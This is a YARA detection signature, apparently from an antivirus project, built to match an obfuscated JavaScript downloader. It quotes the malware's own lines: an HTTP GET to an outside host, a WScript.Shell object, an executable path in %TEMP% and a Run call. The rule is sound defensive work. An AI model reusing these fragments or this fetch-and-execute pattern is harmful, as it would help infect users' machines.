rule sig_20160401_1ac31ef102c9d0cee26f38a218d03238 {
  meta:
    description = "datamaliciousorder - file 20160401_1ac31ef102c9d0cee26f38a218d03238.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0e3c8570f9fad80c677b6914e766299a963f0820f64e67e40be85d5d37b506b5"

  strings:
    $s1  = "RstAjk[GgFru](\"G\" + \"ET\", \"http://sirplusalot.net/l1pasw\", false);" fullword ascii
    $s2  = "var NesRnz = function SgMc() {return WScript[BtpMz](\"WScript\"+\".Shell\");}(), JubDom = 11;" fullword ascii
    $s3  = "function UjlWi(WwPd, PcTnz){ArfHy = ArfHy * 1; return WwPd - PcTnz;};" fullword ascii
    $s4  = "if (RstAjk[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NuYyd(){return PuYtu + \"\";};" fullword ascii
    $s6  = "function PwOxb() {return NesRnz[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HF6Tks3dPOu.ex\" + \"e\";};" fullword ascii
    $s7  = "function WsTzz() {return ((LhwWfl == true) && (LhwWfl == EgePx)) ? 1 : ArfHy;};" fullword ascii
    $s8  = "}while (BwoJae);" fullword ascii
    $s9  = "var OpvMp = new this[\"Date\"]();" fullword ascii
    $s10 = "var LhwWfl = false;" fullword ascii
    $s11 = "var DnxSea = false;" fullword ascii
    $s12 = "function TyYn(){return 23;};" fullword ascii
    $s13 = "function PxNy()" fullword ascii
    $s14 = "return UjlWi(XaEb, DgaOw);" fullword ascii
    $s15 = "EgePx = true; " fullword ascii
    $s16 = "LhwWfl = true; " fullword ascii
    $s17 = "function ZbPn(LiGw) {var UnwIu = (1, 2, 3, 4, 5, LiGw); return UnwIu;};" fullword ascii
    $s18 = "function LegInf(){return BtpMz;};" fullword ascii
    $s19 = "function KukQsz(FjJmh){NesRnz[\"R\"+\"un\"](FjJmh, ArfHy, ArfHy);};" fullword ascii
    $s20 = "var EgePx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}